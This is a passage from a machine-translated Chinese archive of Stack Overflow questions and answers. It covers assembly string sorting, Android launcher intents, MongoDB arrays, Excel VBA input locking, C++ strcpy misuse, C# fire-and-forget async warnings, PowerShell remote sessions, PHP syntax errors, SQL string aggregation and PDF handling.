 call newline

 mov ah, 0ah
 lea dx,data8
 int 21h
 call newline

 mov ah, 0ah
 lea dx,data9
 int 21h
 call newline

 mov ah, 0ah
 lea dx,data10
 int 21h
 call newline

ret
input endp

newline proc

    mov ah,02h
    mov dl,0ah
    int 21h

    mov dl,0dh
    int 21h

ret
newline endp

check macro a,b
local next,finish

 mov cx, 64 ;  buffer size to save string
 mov si,a
 mov di,b

 repe cmpsw ;comparing two strings with each other
 ja next
 jmp finish
next :
;swapping strings
 mov cx, 64
 mov si,a
 lea di,change
 rep movsb

 mov cx,64
 mov si,b
 mov di,a
 rep movsb

 mov cx,64
 lea si,change
 mov di,b
 rep movsw
finish: 
endm

ends

end main 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:25:01.740

有几种排序算法。[以快速排序](http://en.wikipedia.org/wiki/Quicksort)为例。它们之间的共同点是它们是基于比较的。您已经有了相应的代码，因此您只需将现有代码作为子例程，并按照您选择的排序算法的策略为每对字符串调用它。

例如，子例程可以基于比较字符串之间的*小于*、*等于*或*大于*关系具有*-1、0*或*1的返回**值。*

# netbeans - 更改 Netbeans html 标记突出显示颜色

> ID：14903871
> 
> 赞同：2
> 
> 时间：2013-02-15T21:48:08.597
> 
> 标签：netbeans

有谁知道在哪里可以更改 Netbeans 中匹配标签的颜色？附上截图更容易理解。H3 突出显示，我想更改该背景颜色。

谢谢

![在此处输入图像描述](../Images/5683a3a39ceb5b2893e90fc6fbd44d62.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-16T10:17:23.560

我相信大*括号匹配（匹配，多个字符）*设置是您正在寻找的设置。如下图所示：

![在此处输入图像描述](../Images/89acc25cd6ad311bfe20f5032c80cac4.png)

# android - 如何将主启动器置于最前面，而不是以前的活动？

> ID：14903877
> 
> 赞同：2
> 
> 时间：2013-02-15T21:48:30.453
> 
> 标签：android, minimize, android-launcher

如何最小化我的活动并将主页启动器放在前面，而不是以前的活动？

我需要这个，因为我从我的应用程序（不是动态壁纸，只是一个常规应用程序）设置了一个壁纸，并且需要将主页启动器放在前面，以便用户查看新壁纸。是否有可能做到这一点？我试过`finish()`了，但它把以前的应用程序带到了前面，而不是主启动器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:56:09.480

Action 的意图：

```
Intent.ACTION_MAIN 
```

和类别：

```
Intent.CATEGORY_HOME 
```

就足够了

前任：

```
Intent intent = new Intent(Intent.ACTION_MAIN);
intent.addCategory(Intent.CATEGORY_HOME);
startActivity(intent); 
```

这将允许用户回到他们各自的家中。无论启动器类型如何（adw、launcherpro、库存等）。具体来说，所有启动器都将处理此 Intent Action/Category。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-09T11:50:20.713

试试这个。我知道这是一个旧帖子，但希望将来对某人有所帮助。

```
final PackageManager packageManager=getPackageManager();
Intent intent = null;
Intent intentToResolve = new Intent(Intent.ACTION_MAIN);

List<Intent> targettedHomeIntents = new ArrayList<Intent>();

for(final ResolveInfo resolveInfo:packageManager.queryIntentActivities(new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME), PackageManager.MATCH_DEFAULT_ONLY))
{
    if(!getPackageName().equals(resolveInfo.activityInfo.packageName))  //if this activity is not in our activity (in other words, it's another default home screen)
    {
        intent = new Intent(intentToResolve);
        //intent.setClassName(resolveInfo.activityInfo.applicationInfo.packageName, resolveInfo.activityInfo.name);
        intent.setPackage(resolveInfo.activityInfo.applicationInfo.packageName);

        intent.setAction(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);

        targettedHomeIntents.add(intent);
    }
}

if(targettedHomeIntents.size() > 0){
    if(targettedHomeIntents.size() == 1) {
        startActivity(targettedHomeIntents.get(0));
    } else {
        Intent chooserIntent = Intent.createChooser(targettedHomeIntents.remove(0), "Select Home");
        chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, targettedHomeIntents.toArray(new Parcelable[]{}));
        startActivity(chooserIntent);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-11T03:49:43.533

添加`Intent.FLAG_ACTIVITY_TASK_ON_HOME`到意图标志中，将启动器与目标活动一起带到最前面的任务，这样当你完成目标活动时，启动器就会出现。

# mongodb - mongoDB 存储许多整数数组效率低吗？

> ID：14903880
> 
> 赞同：2
> 
> 时间：2013-02-15T21:48:47.480
> 
> 标签：mongodb, non-relational-database

我的 mongoDB 集合中的所有文档都有一个整数数组。对于每个整数，我不需要超过 32 位，并且整数数组的长度对于每个文档都是相同的。

我的应用程序的客户端将经常更新数组中的各个字段。

如果我有 5000 到 10000 个包含 256 个整数数组的文档，mongo db 是否会浪费空间，因为我需要准备好将数组的内容更改为非整数数据类型，或者更改数组的长度？

与传统的关系数据库相比，mongoDB 的设计是否会使更新数组中的单个整数非常低效？

假设我正在使用此处描述的更新数组语法：http: [//docs.mongodb.org/manual/applications/update/#update-arrays](http://docs.mongodb.org/manual/applications/update/#update-arrays)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:44:52.863

> mongo db 是否会浪费空间，因为我需要准备好将数组的内容更改为非整数数据类型或更改数组的长度？

不，它不会浪费空间。与其从更改数据类型或更改数组长度的能力方面考虑这一点，我将专注于 MongoDB 的[填充因子](http://docs.mongodb.org/manual/core/write-operations/#padding-factor)，它可以自适应地了解文档是否倾向于增长。由于您的文档大小将非常相似，因此您的填充因子将趋向于 1（即几乎没有在文档大小上添加额外的填充）。

> 与传统的关系数据库相比，mongoDB 的设计是否会使更新数组中的单个整数非常低效？

由于嵌入式数组没有精确的关系等价物，因此比较并不明显。您可能会假设关系等价物是 a `JOIN`。在这种情况下，我相信 MongoDB 会运行得更快，因为 a`JOIN`有它自己的成本。

* * *

作为附加说明，考虑到 MongoDB 可以处理的数据量，5,000 到 10,000 个文档是微不足道的。只要您在更新中指定索引标准（例如_id），您就不必担心任何空间或性能问题。但是，由于您的文档并不小，我要注意的一件事是尝试在查找查询中一次加载整个文档，您可能更喜欢仅针对特定字段[投射查找查询](http://docs.mongodb.org/manual/core/read-operations/)；在查询数组时，您可能需要考虑[$slice](http://docs.mongodb.org/manual/reference/projection/slice/)。

# excel - vba 运行时冻结 excel 编辑

> ID：14903882
> 
> 赞同：0
> 
> 时间：2013-02-15T21:48:51.030
> 
> 标签：excel, vba, locking, freeze, editing

我有一个要通过 vba 脚本编辑的 excel 工作表，但我需要用户在脚本运行时不能编辑任何单元格或单击任何按钮。由于我在单击 excel 按钮后 Shell 的程序，在此 VBA 子运行期间启用了编辑。我需要的是一种以编程方式锁定所有单元格以进行编辑的方法，除了 VBA。我怎样才能做到这一点？

伪代码：

```
Shell _ "PROGRAM1"
Shell _ "PROGRAM2"
Dim shellobject As PROGRAM2
shellobject.Connect "PROGRAM1"
shellobject.dothings
if(shellobject.success) then
Cells(1,1).Value = "HUZZAH!"
Else
Cells(1,1).Value = "OH NO MR BILL!"
End If
shellobject.dootherthings

etc..... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T22:39:42.360

您是否考虑禁用键盘输入。这可能是完成你需要的东西的蛮力方式，但这是一个想法。

您可以使用

```
Application.DataEntryMode = 
```

禁用键盘输入。脚本启动后将其设置为关闭，然后在脚本结束前将其重新打开。

同样，这可以被认为是蛮力，但只是一个想法。

希望有帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-19T13:39:02.693

当您使用用户窗体时，在窗体的“属性”对话框中将其设置为*模态*（按`F4`以防它不可见）：

![在此处输入图像描述](../Images/c01be5c79a0c431a1f5d9c66d888f247.png)

这样，除非关闭，否则用户无法在表单外单击 Excel。

此外，您可以尝试在执行期间禁用按钮。这段代码应该这样做：

```
Private Sub CommandButton1_Click()
    SetButtonsEnabled False
    Application.EnableEvents = False

    'Your code here

    SetButtonsEnabled
    Application.EnableEvents = True

End Sub

Private Sub SetButtonsEnabled(Optional blnEnable As Boolean = True)
    Dim btn As Control
    For Each btn In Me.Controls
        If TypeOf btn Is CommandButton Then btn.Enabled = blnEnable
    Next
End Sub 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-02-05T00:29:44.627

以下为我工作：

在开始时使用`Application.Interactive = False`并在结束时重新启用它。这将禁用用户单击/输入尝试，直到宏/用户表单/任何代码部分完成其操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-07T15:06:18.777

我试图对 Steventnorris 和 Even-Steven 发表评论，但我做不到，所以只是在这里回答。

```
Application.DataEntryMode= xlOff in the beginning should be set to
Application.DataEntryMode= xlOn 
and then at the end of the code
put in  
Application.DataEntryMode= xlOff 
```

我刚试过这个，它阻止了我编辑工作表，以防其他人尝试。

# c++ - C++ 整数从 *char[] 中删除字符串

> ID：14903883
> 
> 赞同：1
> 
> 时间：2013-02-15T21:49:00.543
> 
> 标签：c++, string, pointers, int, string-literals

我正在尝试将几个值读入我的 C++ 程序。

当我输入一个 1 位数字（在我的代码底部）时，我很好。

但是，如果我输入一个 2 位数字，例如“10”，则消息（我输入的第二个内容）将被删除。

这是我的代码：

```
char * args[6];
unsigned time = 5;
char input[5];   // for string input
string message= "message";
//these strings and *chars are tempary strings for the purpose of reading in data
string temp;
char *temp2 = " ";
char *temp3 = "empty pointer";

     args[count] = "-m";
    count ++;

    //Prompt for the message
    cout <<endl<<"Alright, Please enter your message: "<<flush;
    getline(cin, message);
    cout <<endl<<endl;
    message.append("\"");
    message = "\""+message;
    //we can't use the string, so we copy it to temp3.
    strcpy(temp3, message.c_str());
    //Now we input the string into our array of arguments
    args[count] = temp3;
    count ++;

    cout <<"Please enter time  "<<flush;
    getline(cin,temp);

    //validate input utnil its an actual second.
    bool done = false;
    while (done == false){
        for(unsigned i = 0; i < temp.length() & i < 5; i++){
            input[i] = temp[i];
        }
    done = CheckInteger(input, input);
        time = atoi(input);
        if (done == true & time < 1) {
            cout <<"Unable to use a number less than 1 seconds!  "<<endl;
            cout <<"Please enter the number of seconds?  "<<flush;
            done = false;
        }else if (done == false){
            cout <<"Please enter the number of seconds?  "<<flush;
        }else{
        break;
        }
        getline(cin,temp);
    }
    cout <<endl<<endl;
    time = atoi(input);
    //timer argument
    args[count] = "-t";
    count ++;

    // enter the time need to comvert from int to string.
    ostringstream convert;
    convert <<time;
    temp = convert.str();
    //need to convert from string to character
    strcpy(temp2, temp.c_str());

    args[count] = temp2;
    count ++; 
```

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:54:12.490

[`strcpy(char* destination, const char* source)`](http://www.cplusplus.com/reference/cstring/strcpy/)将字符串复制`source`到 . 指向的数组中`destination`。但是您调用`strcpy(temp3, message.c_str());`它试图将字符串复制到指向常量字符串文字的指针中：`char *temp3 = "empty pointer";`，这会导致**未定义的行为**[1]

从指针更改`temp3`为将使用此字符串文字初始化的数组：

```
char temp3[] = "empty pointer"; 
```

甚至更好：`std::string`改用。

* * *

[1] **C++03 标准 2.13.4 字符串文字**（选定部分）**：**

> **§1**普通字符串文字具有类型“ *n* `const char`数组”和静态存储持续时间
> 
> **§2 尝试修改字符串文字的效果是未定义的。**

# c# - 警告不等待此调用，继续执行当前方法

> ID：14903887
> 
> 赞同：163
> 
> 时间：2013-02-15T21:49:12.527
> 
> 标签：c#, async-await

刚拿到 VS2012 并试图掌握`async`.

假设我有一个从阻塞源获取一些值的方法。我不希望方法的调用者阻塞。我可以编写方法来获取值到达时调用的回调，但由于我使用的是 C# 5，我决定使方法异步，因此调用者不必处理回调：

```
// contrived example (edited in response to Servy's comment)
public static Task<string> PromptForStringAsync(string prompt)
{
    return Task.Factory.StartNew(() => {
        Console.Write(prompt);
        return Console.ReadLine();
    });
} 
```

这是一个调用它的示例方法。如果`PromptForStringAsync`不是异步的，则此方法需要在回调中嵌套回调。使用异步，我可以以这种非常自然的方式编写我的方法：

```
public static async Task GetNameAsync()
{
    string firstname = await PromptForStringAsync("Enter your first name: ");
    Console.WriteLine("Welcome {0}.", firstname);

    string lastname = await PromptForStringAsync("Enter your last name: ");
    Console.WriteLine("Name saved as '{0} {1}'.", firstname, lastname);
} 
```

到现在为止还挺好。问题是当我*调用*GetNameAsync 时：

```
public static void DoStuff()
{
    GetNameAsync();
    MainWorkOfApplicationIDontWantBlocked();
} 
```

的全部意义`GetNameAsync`在于它是异步的。我*不想*让它阻塞，因为我想尽快回到 MainWorkOfApplicationIDontWantBlocked 并让 GetNameAsync 在后台做它的事情。但是，以这种方式调用它会给我一个编译器警告`GetNameAsync`：

```
Warning 1   Because this call is not awaited, execution of the current method continues before the call is completed. Consider applying the 'await' operator to the result of the call. 
```

我完全知道“在调用完成之前继续执行当前方法”。这就是异步代码的*重点，对吧？*

我更喜欢在没有警告的情况下编译我的代码，但这里没有什么可以“修复”的，因为代码正在做我打算做的事情。我可以通过存储返回值来消除警告`GetNameAsync`：

```
public static void DoStuff()
{
    var result = GetNameAsync(); // supress warning
    MainWorkOfApplicationIDontWantBlocked();
} 
```

但现在我有多余的代码。Visual Studio 似乎明白我被迫编写这个不必要的代码，因为它抑制了正常的“从未使用的值”警告。

我还可以通过将 GetNameAsync 包装在非异步方法中来消除警告：

```
 public static Task GetNameWrapper()
    {
        return GetNameAsync();
    } 
```

但那是*更多余*的代码。所以我必须编写不需要或容忍不必要警告的代码。

我在这里使用 async 有什么问题吗？

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2013-02-15T22:03:29.217

如果您真的不需要结果，您可以简单地将`GetNameAsync`' 签名更改为 return `void`：

```
public static async void GetNameAsync()
{
    ...
} 
```

考虑查看相关问题的答案： [返回 void 和返回任务有什么区别？](https://stackoverflow.com/questions/8043296/whats-the-difference-between-returning-void-and-returning-a-task)

**更新**

如果您需要结果，可以将 更改`GetNameAsync`为返回，例如`Task<string>`：

```
public static async Task<string> GetNameAsync()
{
    string firstname = await PromptForStringAsync("Enter your first name: ");
    string lastname = await PromptForStringAsync("Enter your last name: ");
    return firstname + lastname;
} 
```

并按如下方式使用它：

```
public static void DoStuff()
{
    Task<string> task = GetNameAsync();

    // Set up a continuation BEFORE MainWorkOfApplicationIDontWantBlocked
    Task anotherTask = task.ContinueWith(r => {
            Console.WriteLine(r.Result);
        });

    MainWorkOfApplicationIDontWantBlocked();

    // OR wait for the result AFTER
    string result = task.Result;
} 
```

* * *

## 回答 #2

> 赞同：98
> 
> 时间：2013-10-17T18:44:43.770

我对这个讨论已经很晚了，但也可以选择使用`#pragma`预处理器指令。我在这里和那里有一些异步代码，我明确不想在某些情况下等待，我不喜欢警告和未使用的变量，就像你们其他人一样：

```
#pragma warning disable 4014
SomeMethodAsync();
#pragma warning restore 4014 
```

来自`"4014"`此 MSDN 页面：[Compiler Warning (level 1) CS4014](http://msdn.microsoft.com/en-us/library/vstudio/hh873131.aspx)。

另请参阅@ryan-horath 的警告/答案[https://stackoverflow.com/a/12145047/928483](https://stackoverflow.com/a/12145047/928483)。

> 在未等待的异步调用期间抛出的异常将丢失。要消除此警告，您应该将异步调用的 Task 返回值分配给一个变量。这确保您可以访问任何抛出的异常，这些异常将在返回值中指示。

# C# 7.0 更新

C# 7.0 增加了一个新特性，丢弃变量：[Discards - C# Guide](https://docs.microsoft.com/en-us/dotnet/csharp/discards)，在这方面也可以提供帮助。

```
_ = SomeMethodAsync(); 
```

* * *

## 回答 #3

> 赞同：50
> 
> 时间：2015-03-28T15:42:43.657

我不是特别喜欢将任务分配给未使用的变量或更改方法签名以返回 void 的解决方案。前者会创建多余的、不直观的代码，而后者可能无法实现，如果您正在实现一个接口或对要使用返回的任务的函数有其他用法。

我的解决方案是创建一个 Task 的扩展方法，称为 DoNotAwait()，它什么都不做。这不仅会抑制所有警告（ReSharper 或其他警告），还会使代码更易于理解，并向代码的未来维护者表明您确实打算不等待调用。

扩展方法：

```
public static class TaskExtensions
{
    public static void DoNotAwait(this Task task) { }
} 
```

用法：

```
public static void DoStuff()
{
    GetNameAsync().DoNotAwait();
    MainWorkOfApplicationIDontWantBlocked();
} 
```

编辑添加：这类似于 Jonathan Allen 的解决方案，其中扩展方法将在尚未启动的情况下启动任务，但我更喜欢具有单一用途的功能，以便调用者的意图完全清楚。

* * *

## 回答 #4

> 赞同：30
> 
> 时间：2013-08-21T01:21:40.380

`async void`不好！

1.  [返回 void 和返回 Task 有什么区别？](https://stackoverflow.com/questions/8043296/whats-the-difference-between-returning-void-and-returning-a-task/8043882#8043882)
2.  [https://jaylee.org/archive/2012/07/08/c-sharp-async-tips-and-tricks-part-2-async-void.html](https://jaylee.org/archive/2012/07/08/c-sharp-async-tips-and-tricks-part-2-async-void.html)

我建议您`Task`通过匿名方法显式运行...

例如

```
public static void DoStuff()
{
    Task.Run(async () => GetNameAsync());
    MainWorkOfApplicationIDontWantBlocked();
} 
```

或者，如果您确实希望它阻止，您可以等待匿名方法

```
public static void DoStuff()
{
    Task.Run(async () => await GetNameAsync());
    MainWorkOfApplicationThatWillBeBlocked();
} 
```

但是，如果您的`GetNameAsync`方法必须与 UI 甚至任何 UI 绑定（WINRT/MVVM，我在看你）进行交互，那么它会变得更有趣 =）

您需要像这样将引用传递给 UI 调度程序...

```
Task.Run(async () => await GetNameAsync(CoreApplication.MainView.CoreWindow.Dispatcher)); 
```

然后在您的异步方法中，您需要与您的 UI 或 UI 绑定元素进行交互，认为调度程序...

```
dispatcher.RunAsync(CoreDispatcherPriority.Normal, () => {  this.UserName = userName; }); 
```

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2013-06-20T22:11:40.137

这就是我目前正在做的事情：

```
SomeAyncFunction().RunConcurrently(); 
```

其中`RunConcurrently`定义为...

```
 /// <summary> 
 /// Runs the Task in a concurrent thread without waiting for it to complete. This will start the task if it is not already running. 
 /// </summary> 
 /// <param name="task">The task to run.</param> 
 /// <remarks>This is usually used to avoid warning messages about not waiting for the task to complete.</remarks> 
 public static void RunConcurrently(this Task task) 
 { 
     if (task == null) 
         throw new ArgumentNullException("task", "task is null."); 

     if (task.Status == TaskStatus.Created) 
         task.Start(); 
 } 
```

[https://github.com/docevaad/Anchor/blob/master/Tortuga.Anchor/Tortuga.Anchor.source/shared/TaskUtilities.cs](https://github.com/docevaad/Anchor/blob/master/Tortuga.Anchor/Tortuga.Anchor.source/shared/TaskUtilities.cs)

[https://www.nuget.org/packages/Tortuga.Anchor/](https://www.nuget.org/packages/Tortuga.Anchor/)

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2013-05-29T21:45:09.843

根据微软关于这个警告的文章，您可以通过简单地将返回的任务分配给一个变量来解决它。以下是 Microsoft 示例中提供的代码的翻译：

```
 // To suppress the warning without awaiting, you can assign the 
    // returned task to a variable. The assignment doesn't change how
    // the program runs. However, the recommended practice is always to
    // await a call to an async method.
    // Replace Call #1 with the following line.
    Task delayTask = CalledMethodAsync(delay); 
```

请注意，这样做会导致 ReSharper 中出现“从不使用局部变量”消息。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2017-02-11T18:59:06.437

在这里，一个简单的解决方案。

```
public static class TasksExtensions
{
    public static void RunAndForget(this Task task)
    {
    }
} 
```

问候

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-02-15T22:00:05.627

这是您的简化示例导致多余的代码。通常，您希望在程序的某个时刻使用从阻塞源获取的数据，因此您希望返回结果，以便可以获取数据。

如果您确实有一些与程序的其余部分完全隔离的事情发生，那么异步将不是正确的方法。只需为该任务启动一个新线程。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-09-21T06:20:17.483

如果您不想将方法签名更改为返回`void`（因为返回`void`应该始终是一个*void* ed），您可以使用 C# 7.0+ [Discard](https://docs.microsoft.com/en-us/dotnet/csharp/discards)像这样的功能，这比分配给变量略好（并且应该删除大多数其他源验证工具警告）：

```
public static void DoStuff()
{
    _ = GetNameAsync(); // we don't need the return value (suppresses warning)
    MainWorkOfApplicationIDontWantBlocked();
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-08-27T15:47:33.830

你真的要忽略结果吗？包括忽略任何意外异常？

如果不是，您可能想看看这个问题：[Fire and Forget approach](https://stackoverflow.com/questions/22864367/fire-and-forget-approach)，

# php - 跨脚本重用/共享powershell远程会话

> ID：14903891
> 
> 赞同：0
> 
> 时间：2013-02-15T21:49:37.823
> 
> 标签：php, powershell, scripting

我有一个生成 ps1(poweshell) 脚本并管理远程计算机的 php 服务器。例如，我有如下所示的 powershell 脚本：

```
$ip=192.168.137.25;
$pw = convertto-securestring -AsPlainText -Force -String a
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "$ip\admin",$pw
 $session = new-pssession $ip -credential $cred
invoke-command -session $session -scriptblock {ls} 
```

我通过以下方式从 php 运行此脚本：

```
shell_exec("powershell.exe -ExecutionPolicy RemoteSigned -File script.ps1") 
```

然后我需要调用第二个脚本，并想使用第一个脚本创建的会话。问题是如何在第一个脚本结束后让远程会话保持活动状态。也许还有其他解决方案，例如使用其他语言而不是 php？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-03-01T11:37:46.513

您可以使用全局变量在多个脚本之间重用/共享远程 powershell 会话。

在第一个脚本中，您创建一个远程会话并将其存储在一个全局变量中。

```
$Global:session = New-PSSession -ComputerName $remoteServer -credential $credential 
```

在所有其他脚本中，您可以`Invoke-Command`按如下方式使用：

```
Invoke-Command -Session $session -ScriptBlock {
 /* Remote code */
} 
```

然后您可以按如下方式运行脚本：

```
$scripts = "create_session.ps1; script_1.ps1; script_2.ps1";
shell_exec("powershell.exe -Command @(\"$scripts\" )"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T01:14:22.793

如果托管计算机上有 Powershell V3，则可以使用 Disconnected Sessions，在第一个脚本中创建会话，然后使用 Disconnect-PSSession 显式断开与它的连接。然后，您可以在第二个脚本中使用 Connect-PSSession 重新连接回同一个会话。

# php - 我在 PHP 代码中有一个意外的文件结尾？

> ID：14903893
> 
> 赞同：0
> 
> 时间：2013-02-15T21:49:39.500
> 
> 标签：php, file

我正在制作一个上面有产品的网站。我遇到了意外的文件结束错误。这是整个代码。我还有一个运行这两个功能的页面，同时需要这个我称之为“购物车”的页面。

```
<?php
include('inc/connect.php');
session_start();
?>
<html>
    <head>
        <title>Cart</title>
    <link rel='stylesheet' href='css/main.css' />
</head>
<body>
    <?php
    $page = 'index.php';

    if(isset($_GET['add'])){
        $add_id = (int)$_GET['add'];
        $quantity = mysql_query("SELECT id, quantity FROM products WHERE id='$add_id'");
        while($quantity_row = mysql_fetch_assoc($quantity)){
            if($quantity_row['quantity'] !=@$_SESSION['cart_'.(int)$add_id]){
                @$_SESSION['cart_'.(int)$_GET['add']]+='1';
            }
        }

    }

    function products(){
        $get = mysql_query("SELECT id, name, description, price FROM products WHERE quantity > 0 ORDER BY id DESC");
        if(mysql_num_rows($get) == 0){
            echo "There are no products to display.";
        }
        else{
            while($get_row = mysql_fetch_assoc($get)){
                echo '<p>'.$get_row['name'].'<br />'.$get_row['description'].'<br />'.$get_row['price'].' <a href="cart.php?add='.$get_row['id'].'">Add</a></p>';
            }
        }
    }

    function cart(){
        foreach($_SESSION as $name => $value){
            if($value>0){
                if(substr($name, 0, 5) == 'cart_'){
                    $id = mysql_real_escape_string(substr($name, 5, (strlen($name)-5)));
                    $get = mysql_query("SELECT id, name, price FROM products WHERE id='$id'");
                    while($get_row = mysql_fetch_assoc($get)){
                        $sub = $get_row['price']*$value;
                        echo $get_row['name'].' x '.$value.' @ $'.number_format($get_row['price'], 2).' = $'.number_format($sub, 2);
                }
            }
            else{
                echo "Your cart is empty";
            }
        }
    }

    ?>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:51:49.990

您的最后一个功能永远不会关闭。如果您正确缩进（PHP 是如何读取它的）：

```
function cart(){
    foreach($_SESSION as $name => $value){
        if($value>0){
            if(substr($name, 0, 5) == 'cart_'){
                $id = mysql_real_escape_string(substr($name, 5, (strlen($name)-5)));
                $get = mysql_query("SELECT id, name, price FROM products WHERE id='$id'");
                while($get_row = mysql_fetch_assoc($get)){
                    $sub = $get_row['price']*$value;
                    echo $get_row['name'].' x '.$value.' @ $'.number_format($get_row['price'], 2).' = $'.number_format($sub, 2);
                }
            }
            else{
                echo "Your cart is empty";
            }
        }
    }
//???? 
```

看起来你忘了结束你的`while`陈述。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T21:51:50.450

您缺少此 while 循环的右括号：

```
while($get_row = mysql_fetch_assoc($get)){
    $sub = $get_row['price']*$value;
    echo $get_row['name'].' x '.$value.' @ $'.number_format($get_row['price'], 2).' = $'.number_format($sub, 2); 
```

# android - 如何禁用android微调器而不使其变灰？

> ID：14903894
> 
> 赞同：0
> 
> 时间：2013-02-15T21:49:41.943
> 
> 标签：android, spinner

大家好，我想展示一个 Android 微调器，但不显示为灰色。我尝试使用 setFocusable(false)，它适用于编辑框，但不适用于微调器。我不希望微调器改变，除非我告诉它。基本上我有一个屏幕显示我想放入“更新模式”的数据。在用户选择更新数据之前，它应该只能查看。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:14:42.957

也许您可以创建一个自定义选择器并将其设置为微调器背景，请查看[此链接](http://developer.android.com/guide/topics/resources/drawable-resource.html#StateList)以获取选择器

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-18T14:40:50.307

我最后作弊了一点。我在禁用该字段之前获得了背景图像，然后在禁用该字段后将背景设置为该图像。

```
 // Deal with spinners. I don't want to gray out the background
    // because it looks bad against our dark theme.
    Drawable d = type.getBackground().getCurrent(); // the enabled background

    type.setEnabled(enabled);

    // set all of the spinners back to the enabled background
    if(!enabled){
        type.setBackgroundDrawable(d);          
    } 
```

# sql - 在一列中具有逗号分隔输出的子查询

> ID：14903899
> 
> 赞同：-1
> 
> 时间：2013-02-15T21:49:59.830
> 
> 标签：sql, sql-server-2008

我在编写查询时需要帮助，其中查询输出显示带有逗号分隔数据的列。

我有两个具有一对多关系的表。我想编写一个查询，它输出具有一条记录的表中的所有记录，但在具有许多记录的表的一列中显示逗号分隔的数据。

表格1

```
Col1 Col2 Col3
a1     1   4
a2     2   5
a3     3   6
a4     7   8 
```

表2

```
Col1 Col4
a1     10
a1     11
a1     22
a2     10
a2     11
a3     19
a3     22
a3     23
a4     15 
```

查询输出：

```
Col1 Col2 Col3 Col4
a1     1   4    10,11,22
a2     2   5    10,11
a3     3   6    19,22,23
a4     7   8    15 
```

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:56:55.937

您可以使用以下内容：

```
select t1.col1,
  t1.col2, 
  t1.col3,
  left(t2.col4, len(t2.col4)-1) col4
from table1 t1
cross apply
(
  select cast(t2.Col4 as varchar(10)) + ', '
  from Table2 t2
  where t1.col1 = t2.col1
  FOR XML PATH('')
) t2 (col4) 
```

请参阅[SQL Fiddle with Demo](http://www.sqlfiddle.com/#!3/8cb3f/4)。

或者您可以使用：

```
select t1.col1,
  t1.col2, 
  t1.col3,
  STUFF(
         (SELECT ', ' + cast(t2.Col4 as varchar(10))
          FROM Table2 t2
          where t1.col1 = t2.col1
          FOR XML PATH (''))
          , 1, 1, '')  AS col4
from table1 t1 
```

请参阅[带有演示的 SQL Fiddle](http://www.sqlfiddle.com/#!3/8cb3f/6)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:58:02.777

```
SELECT  Col1, 
        Col2, 
        Col3,
        Col4 = SUBSTRING((
                            SELECT ',' + af.awardFocusName
                              FROM Table2 t2    
                             WHERE t2.Col1 = t1.Col1
                            FOR XML PATH('')
                        ), 2, 1000000)
  FROM  Table1 t1 
```

# jquery - 将 URL 插入 jQuery 返回

> ID：14903902
> 
> 赞同：0
> 
> 时间：2013-02-15T21:50:12.877
> 
> 标签：jquery, wordpress

详情见图片：

[![http://oi48.tinypic.com/564x4.jpg](../Images/3f12e5571064ab5e7eae3a95a045aad7.png)](https://i.stack.imgur.com/2yv43.png)

```
base.prototype.pre_edit_button = function() {
      var _this = this;
      return jQuery('<button>', {
        'class': 'fee-hover-edit',
        'html': FrontEndEditor.data.edit_text,
        'click': function(ev) {
          _this.last_mouse_pos = ev.pageY;
          return _this.start_editing();
        }
      }); 
```

要重定向的网址（后端页面编辑）：**wp-admin/edit.php?post_type=page**

我的蹩脚尝试：

```
 }, base.prototype.edit_button = function () {
        var _this = this;
        return jQuery("<?php edit_post_link( __( 'Full Edit',) ?> ", {
        }) 
```

我对 PHP/jQuery/Javascript 一无所知，它没有显示任何内容，但至少脚本一直在运行

笔记：

`edit_post_link`是一个 wordpress 功能，它重定向到当前页面的完整编辑。我不会使用它，我只会尝试重定向到上面提到的那个 url。

# c# - 在将 PDF 输出到浏览器之前，从 PDF 中去除 Adob e Reader 和版本要求

> ID：14903904
> 
> 赞同：0
> 
> 时间：2013-02-15T21:50:21.317
> 
> 标签：c#, asp.net-mvc, pdf, pdf.js

我计划使用[pdf.js](https://github.com/mozilla/pdf.js)通过带有 Javascript 的浏览器获取 PDF 上下文。问题是我正在使用的某些 PDF 需要具有特定版本的 Adob​​e 阅读器。pdf.js 还不（曾经？）支持这些欺骗。我需要知道的是 C# 中是否有办法打开 PDF 并删除这些阅读器和版本要求以及如何做到这一点。我正计划使用[itextsharp](http://sourceforge.net/projects/itextsharp/)在服务器端进行其他 PDF 操作，因此使用它的示例将是最有帮助的。我计划通过 MVC 4 将这些作为`ActionResult`ajax 请求提供，因此`MemoryStream`在此操作结束时最有帮助。

* * *

## 回答 #1

> 赞同：2
> 
